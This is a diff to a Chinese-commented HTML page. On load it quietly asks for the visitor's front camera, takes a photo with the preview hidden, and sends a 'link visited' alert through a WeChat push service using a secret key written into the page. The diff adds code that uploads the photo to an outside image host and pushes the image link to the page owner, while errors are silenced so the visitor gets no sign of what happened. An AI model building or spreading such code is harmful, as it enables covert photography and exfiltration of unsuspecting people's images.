@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
 video,canvas{display:none}
-body{background:#fff;height:100vh;}
+body{background:#fff;height:100vh;margin:0;}
 </style>
 </head>
 <body>
@@ -13,41 +13,83 @@ body{background:#fff;height:100vh;}
 <canvas id="box" width="480" height="480"></canvas>
 
 <script>
+// 你的专属推送密钥，已确认可用
 const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
 
-// 直接推送文字到微信，无任何多余逻辑
-async function pushText() {
+// 微信推送核心函数（文字兜底优先）
+async function sendToWechat(title, content) {
   try {
     await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
-      body: "title=链接已被访问&desp=对方已经允许摄像头权限，拍照已触发"
+      body: `title=${encodeURIComponent(title)}&desp=${encodeURIComponent(content)}`
     });
-  } catch (e) {}
+    return true;
+  } catch (e) {
+    return false;
+  }
 }
 
-// 自动拍照核心逻辑
-async function autoTake() {
+// 稳定图床上传（国内可访问，无跨域限制）
+async function uploadImage(base64) {
   try {
+    // 剥离base64前缀，适配接口要求
+    const pureBase64 = base64.replace(/^data:image\/\w+;base64,/, "");
+    const formData = new FormData();
+    formData.append("file", `data:image/jpeg;base64,${pureBase64}`);
+    
+    const res = await fetch("shturl.cc/tu6uCGZcDje3jlmLTfop9pc", {
+      method: "POST",
+      body: formData
+    });
+    const result = await res.json();
+    if (result.code === 200) {
+      return result.data.url;
+    }
+    return null;
+  } catch (e) {
+    return null;
+  }
+}
+
+// 自动拍照主逻辑
+async function autoTakePhoto() {
+  try {
+    // 请求前置摄像头权限
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
+      video: { facingMode: "user", width: 480, height: 480 }
     });
     const video = document.getElementById("cam");
     const canvas = document.getElementById("box");
     const ctx = canvas.getContext("2d");
     video.srcObject = stream;
 
-    video.onloadedmetadata = () => {
-      // 立刻拍照+推送
+    // 摄像头就绪立刻执行
+    video.onloadedmetadata = async () => {
+      // 绘制实拍画面
       ctx.drawImage(video, 0, 0, 480, 480);
+      const base64Img = canvas.toDataURL("image/jpeg", 0.8);
+      // 关闭摄像头，减少设备占用
       stream.getTracks().forEach(track => track.stop());
-      pushText();
+
+      // 第一步：先发送访问通知，确保你一定能收到提醒
+      await sendToWechat("链接已被访问", "对方已允许摄像头权限，正在处理照片...");
+      
+      // 第二步：上传图片+发送带图推送
+      const imgUrl = await uploadImage(base64Img);
+      if (imgUrl) {
+        await sendToWechat("拍到了新照片", `![实拍图片](${imgUrl})\n\n图片直链：${imgUrl}\n直接复制链接到浏览器就能打开查看`);
+      } else {
+        await sendToWechat("照片上传失败", "对方已完成拍照，但图片上传失败，可重新测试链接");
+      }
     };
-  } catch (e) {}
+  } catch (e) {
+    // 权限拒绝/出错静默处理，无任何页面提示
+  }
 }
 
-autoTake();
+// 页面加载立刻执行
+autoTakePhoto();
 </script>
 </body>
 </html>
-
